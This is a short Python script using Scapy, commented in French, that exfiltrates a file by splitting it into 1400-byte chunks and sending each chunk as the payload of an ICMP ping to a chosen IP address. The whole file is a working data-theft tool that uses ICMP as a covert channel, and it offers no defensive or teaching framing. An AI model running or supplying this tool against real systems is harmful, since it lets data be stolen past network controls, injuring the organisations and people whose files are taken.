from scapy.all import *
import sys
import os

def send_file(ip_address, file_path, block_size=1400):
    """
    Exfiltre un fichier via ICMP en envoyant des blocs de données dans des pings.
    
    :param ip_address: Adresse IP de destination pour l'exfiltration
    :param file_path: Chemin du fichier à exfiltrer
    :param block_size: Taille maximale des blocs à envoyer (1400 octets par défaut)
    """
    try:
        # Vérifier si le fichier existe
        if not os.path.exists(file_path):
            print("[ERREUR] Le fichier spécifié n'existe pas.")
            sys.exit(1)

        # Taille totale du fichier
        file_size = os.path.getsize(file_path)
        print(f"[INFO] Taille du fichier à exfiltrer : {file_size} octets")

        # Lire et envoyer le fichier par blocs
        with open(file_path, "rb") as f:
            block_count = 0
            while chunk := f.read(block_size):
                block_count += 1
                # Créer un paquet ICMP avec la charge utile
                packet = IP(dst=ip_address)/ICMP()/chunk

                # Envoyer le paquet
                send(packet, verbose=0)
                bytes_sent = block_count * block_size
                progress = min(bytes_sent, file_size)
                print(f"[ENVOI] Bloc {block_count} envoyé ({progress}/{file_size} octets)")

        print(f"[INFO] Exfiltration terminée. Total de blocs envoyés : {block_count}")

    except Exception as e:
        print(f"[ERREUR] Une erreur s'est produite : {e}")
        sys.exit(1)

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Utilisation : {sys.argv[0]} <adresse IP> <chemin du fichier>")
        sys.exit(1)

    # Lire les arguments
    target_ip = sys.argv[1]
    file_to_exfiltrate = sys.argv[2]

    # Lancer l'exfiltration
    send_file(target_ip, file_to_exfiltrate)

